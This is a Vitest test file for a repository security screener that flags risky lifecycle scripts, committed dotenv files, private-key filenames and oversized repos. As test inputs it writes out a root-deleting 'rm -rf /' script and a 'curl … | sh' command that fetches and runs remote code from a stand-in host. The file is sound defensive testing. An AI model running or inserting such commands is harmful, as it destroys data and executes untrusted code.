import { describe, expect, it } from "vitest";

import { repoSecurityEvidenceFixture } from "../../test-support/repo-security-evidence-fixture";
import { screenRepoSecurity } from "./repo-security-screen";

describe("screenRepoSecurity", () => {
  it("passes a rootless browser app after inspecting its bounded nested manifest", () => {
    const result = screenRepoSecurity({
      evidence: repoSecurityEvidenceFixture(),
      files: [
        { path: "go.mod" },
        {
          path: "webapp/package.json",
          text: JSON.stringify({ scripts: { postinstall: "node setup.js" } }),
        },
        { path: "webapp/package-lock.json" },
      ],
      repoStats: { fileCount: 3, sizeBytes: 1_000 },
    });

    expect(result.status).toBe("passed");
    expect(result.rejections).toEqual([]);
    expect(result.warnings.map((finding) => finding.code)).toEqual(
      expect.arrayContaining([
        "nested-application-manifest",
        "lifecycle-postinstall",
      ]),
    );
    expect(result.warnings.map((finding) => finding.code)).not.toContain(
      "missing-lockfile",
    );
  });

  it("rejects repos with obvious static safety failures", () => {
    const result = screenRepoSecurity({
      evidence: repoSecurityEvidenceFixture(),
      files: [
        {
          path: "package.json",
          text: JSON.stringify({ scripts: { demo: "  rm   -rf   /  " } }),
        },
        { path: ".env", text: "API_KEY=secret" },
      ],
      repoStats: { fileCount: 10, sizeBytes: 100_000 },
    });

    expect(result.status).toBe("rejected");
    expect(result.rejections).toContainEqual(
      expect.objectContaining({
        code: "lifecycle-root-delete",
        path: "package.json",
        scriptName: "demo",
        severity: "hard-rejection",
      }),
    );
    expect(result.rejections.map((finding) => finding.code)).not.toContain(
      "committed-dotenv",
    );
  });

  it("warns for ambiguous lifecycle scripts without hard-rejecting them", () => {
    const result = screenRepoSecurity({
      evidence: repoSecurityEvidenceFixture(),
      files: [
        {
          path: "package.json",
          text: JSON.stringify({
            scripts: {
              build: "echo 'rm -rf /'",
              prepare: "curl https://example.test/install.sh | sh",
            },
          }),
        },
        { path: "package-lock.json" },
      ],
      repoStats: { fileCount: 2, sizeBytes: 1_000 },
    });

    expect(result.status).toBe("passed");
    expect(result.rejections).toEqual([]);
    expect(result.warnings.map((finding) => finding.code)).toEqual(
      expect.arrayContaining([
        "lifecycle-suspicious-command",
        "lifecycle-remote-code-execution",
      ]),
    );
  });

  it("does not treat vendored or deep manifests as the submitted browser app", () => {
    const result = screenRepoSecurity({
      evidence: repoSecurityEvidenceFixture(),
      files: [
        { path: "vendor/pkg/package.json", text: "{" },
        { path: "apps/web/client/package.json", text: "{" },
      ],
      repoStats: { fileCount: 2, sizeBytes: 1_000 },
    });

    expect(result.status).toBe("passed");
    expect(result.rejections).toEqual([]);
    expect(result.warnings).toContainEqual(
      expect.objectContaining({
        code: "missing-supported-application-manifest",
        severity: "warning",
      }),
    );
    expect(JSON.stringify(result.warnings)).not.toContain("malformed");
  });

  it("classifies a malformed supported manifest for agent review", () => {
    const result = screenRepoSecurity({
      evidence: repoSecurityEvidenceFixture(),
      files: [{ path: "apps/web/package.json", text: "{" }],
      repoStats: { fileCount: 1, sizeBytes: 10 },
    });

    expect(result.status).toBe("passed");
    expect(result.rejections).toEqual([]);
    expect(result.warnings).toContainEqual(
      expect.objectContaining({
        code: "malformed-application-manifest",
        path: "apps/web/package.json",
      }),
    );
  });

  it("allows dotenv files and classifies private-key filenames for agent review", () => {
    const result = screenRepoSecurity({
      evidence: repoSecurityEvidenceFixture(),
      files: [
        { path: "package.json", text: JSON.stringify({}) },
        { path: ".env", text: "API_KEY=DOTENV_CANARY_ORIGINAL" },
        { path: ".env.test", text: "API_KEY=test" },
        { path: ".env.development", text: "API_KEY=development" },
        { path: ".env.production", text: "API_KEY=production" },
        { path: ".env.test.local.template", text: "API_KEY=template" },
        { path: "apps/web/.env.production", text: "API_KEY=nested" },
        { path: "config/id_ed25519", text: "private-key" },
      ],
      repoStats: { fileCount: 10, sizeBytes: 100_000 },
    });

    expect(result.status).toBe("passed");
    expect(result.rejections).not.toEqual(
      expect.arrayContaining([
        expect.stringContaining("repo contains committed secret file .env"),
      ]),
    );
    expect(JSON.stringify(result)).not.toContain("DOTENV_CANARY_ORIGINAL");
    expect(result.warnings).toContainEqual(
      expect.objectContaining({
        code: "private-key-filename",
        path: "config/id_ed25519",
      }),
    );
  });

  it("warns for large repos and non-fatal preparation risks", () => {
    const result = screenRepoSecurity({
      evidence: repoSecurityEvidenceFixture(),
      files: [
        {
          path: "package.json",
          text: JSON.stringify({
            dependencies: { "@clerk/clerk-react": "latest" },
            scripts: { postinstall: "node setup.js" },
          }),
        },
      ],
      repoStats: { fileCount: 25_000, sizeBytes: 600_000_000 },
    });

    expect(result.status).toBe("passed");
    expect(result.warnings.map((finding) => finding.code)).toEqual(
      expect.arrayContaining([
        "large-repository",
        "missing-lockfile",
        "lifecycle-postinstall",
        "auth-dependency",
      ]),
    );
  });
});
